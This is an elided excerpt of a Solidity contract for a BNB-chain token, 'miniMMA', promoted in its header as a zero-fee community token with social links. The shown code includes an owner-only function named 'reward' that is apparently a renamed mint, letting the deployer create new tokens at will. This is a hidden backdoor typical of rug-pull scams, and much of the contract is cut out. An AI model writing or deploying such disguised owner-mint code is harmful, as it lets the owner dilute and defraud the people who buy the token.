...
/**
    ...
    %0 Fee community token
    
    miniMMAnft.store
    twitter.com/MiniMMAnft
    t.me/miniMMAnft
    
    Initial lp: only 0.5 BnB
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function reward(uint256 amount) public onlyOwner {
    ...
    function _reward(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: bnb to the zero address");
...
contract miniMMA is ERC20 {

    uint tokenTotalSupply = 10000000000000000;

    constructor() public ERC20("miniMMA", "MMA") {
        _reward(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}